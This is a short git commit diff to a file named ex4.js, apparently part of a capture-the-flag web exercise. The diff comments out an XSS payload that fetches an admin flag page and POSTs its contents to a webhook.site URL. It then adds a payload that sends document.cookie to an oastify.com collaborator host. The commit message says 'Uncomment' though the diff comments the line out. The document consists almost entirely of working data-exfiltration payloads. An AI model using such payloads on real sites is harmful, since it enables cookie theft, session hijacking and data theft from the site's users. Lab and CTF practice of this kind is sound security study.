1c4ceb0509163dc73e3f41eb702c0efcfe7063cd
0xB0xB <37478611+0xB0xB@users.noreply.github.com>
2026-01-14 10:53:58 +0400

    Uncomment fetch call and add new fetch for cookies

--- ex4.js
+++ ex4.js
@@ -1,1 +1,3 @@
-fetch('/admin/retrieve-flag-2-new').then(r=>r.text()).then(d=>fetch('https://webhook.site/0b8aee5b-c91a-44fc-b825-d36d6ad0bc6e',{method:'POST',body:d}))
+//fetch('/admin/retrieve-flag-2-new').then(r=>r.text()).then(d=>fetch('https://webhook.site/0b8aee5b-c91a-44fc-b825-d36d6ad0bc6e',{method:'POST',body:d}))
+
+fetch('3qutedu6ifxiplg1m57kl2jbv21tpjd8.oastify.com/test='+document.cookie)
